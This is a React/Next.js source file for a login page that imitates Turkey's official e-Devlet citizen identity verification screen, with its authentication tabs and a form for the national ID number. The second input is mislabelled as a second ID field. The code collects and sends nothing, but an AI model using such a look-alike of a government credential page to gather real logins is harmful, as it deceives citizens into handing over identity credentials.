import { clsnm } from '@ethylene/utils';
import { NextPage } from 'next';
import trLogin from '../assets/tr-login.png';
import styles from 'styles/login.module.scss';

const Login: NextPage = () => {
  return (
    <div
      className={clsnm(
        'flex h-screen w-screen items-center justify-center',
        styles.bg,
      )}
    >
      <div className={clsnm(styles.outer)}>
        <header>
          <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>
        </header>
        <main>
          <section>
            <img src={trLogin.src} alt="" width="165" height="40" />
          </section>
          <nav className={clsnm(styles.methodSelector)}>
            <div className={clsnm(styles.tabChoser)}>
              <nav className={clsnm(styles.tabList)}>
                <div className={clsnm(styles.tab)}>
                  <span>E-Devlet Şifresi</span>
                </div>
                <div className={clsnm(styles.tab)}>
                  <span>Mobil İmza</span>
                </div>
                <div className={clsnm(styles.tab)}>
                  <span>e-İmza</span>
                </div>
                <div className={clsnm(styles.tab)}>
                  <span>T.C. Kimlik Kartı</span>
                </div>
                <div className={clsnm(styles.tab)}>
                  <span>İnternet Bankacılığı</span>
                </div>
              </nav>
            </div>
            <section className={clsnm(styles.pageContent)}>
              <div className={clsnm(styles.richText)}>
                "T.C. Kimlik Numaranızı ve e-Devlet Şifrenizi kullanarak
                kimliğiniz doğrulandıktan sonra işleminize kaldığınız yerden
                devam edebilirsiniz."
              </div>
              <div className={clsnm(styles.fieldSet)}>
                <form className={clsnm(styles.inputForm)} method="post">
                  <div className={clsnm(styles.formRow)}>
                    <label className={clsnm(styles.rowLabel)}>
                      T.C. Kimlik No
                    </label>
                    <input></input>
                  </div>
                  <div className={clsnm(styles.formRow)}>
                    <label className={clsnm(styles.rowLabel)}>
                      T.C. Kimlik No
                    </label>
                    <input></input>
                  </div>
                </form>
              </div>
            </section>
          </nav>
        </main>
      </div>
    </div>
  );
};

export default Login;
